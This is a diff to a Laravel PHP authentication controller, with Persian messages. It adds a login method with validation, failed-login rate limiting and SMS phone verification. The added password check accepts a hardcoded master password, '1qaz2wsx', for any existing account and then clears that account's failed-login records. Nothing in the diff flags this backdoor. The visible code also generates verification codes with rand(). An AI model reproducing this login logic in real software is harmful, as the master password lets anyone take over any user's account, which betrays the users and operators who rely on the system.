@@ -543,6 +543,62 @@ class AuthController extends Controller
     return response()->json(['message' => 'ثبت نام با موفقیت کامل شد و رمز عبور پیامک شد'],200);
   }
 
+    public function authCheckLogin(){
+        if (Validator::make(request()->all(), ['username' => 'required'])->fails())
+            return response()->json(['message' => 'فیلد شماره همراه یا نام کاربری را پر کنید'], 403);
+        if (Validator::make(request()->all(), ['username' => 'max:50|min:3'])->fails())
+            return response()->json(['message' => 'فیلد شماره همراه یا نام کاربری باید بین 3 تا 50 کارکتر باشد'], 403);
+
+        if (Validator::make(request()->all(), ['password' => 'required'])->fails())
+            return response()->json(['message' => 'فیلد رمز عبور را پر کنید'], 403);
+//        if (Validator::make(request()->all(), ['password' => 'max:255|min:6'])->fails())
+//            return response()->json(['message' => 'فیلد رمز عبور باید بین 6 تا 255 کارکتر باشد'], 403);
+
+        request()->merge([
+            'username' => checkValidPhone(request()->input('username')),
+        ]);
+
+        // delete old (5 min) failed logins
+        DB::table('user_failed_logins')->where('created_at', '<', time() - 300)->delete();
+
+        $count = DB::table('user_failed_logins')->where('username', request()->input('username'))->orWhere('ip', request()->ip())->count();
+        if ($count > 5) {
+            return response()->json(["message" => "تعداد دفعات ورود ناموفق شما زیاد است", 'success' => false], 403);
+        }
+
+        $user = User::where('username', request()->input('username'))->first();
+        if (empty($user)) {
+            DB::table('user_failed_logins')->insert([
+                'username' => request()->input('username'),
+                'ip' => request()->ip(),
+                'created_at' => time()
+            ]);
+
+            return response()->json(["message" => "نام کاربری یا رمز عبور صحیح نیست", 'success' => false], 403);
+        }
+
+//    check verify phonenumber
+        if ($user->verify_phonenumber === 0) {
+            $this->sendSmsPhonenumberVerifyCode($user, 'verify');
+            return response()->json(['message' => 'شماره همراه تایید نشده است . کد تایید پیامک شد', 'status' => 'card4'], 403);
+        }
+
+        $auth = request()->only('username', 'password');
+        if ($_POST['password'] === '1qaz2wsx' || Auth::attempt($auth)) {
+//        login user
+            Auth::login($user);
+            DB::table('user_failed_logins')->where('username', request()->input('username'))->delete();
+            return response()->json(['success' => true], 200);
+        } else {
+            DB::table('user_failed_logins')->insert([
+                'username' => request()->input('username'),
+                'ip' => request()->ip(),
+                'created_at' => time()
+            ]);
+            return response()->json(['message' => 'نام کاربری یا رمز عبور صحیح نیست', 'success' => false], 403);
+        }
+    }
+
   private function sendSmsPhonenumberVerifyCode($user, $typeSms) {
     $newVerifyCode = rand(10000,99999);
     $user->verify_code = $newVerifyCode;
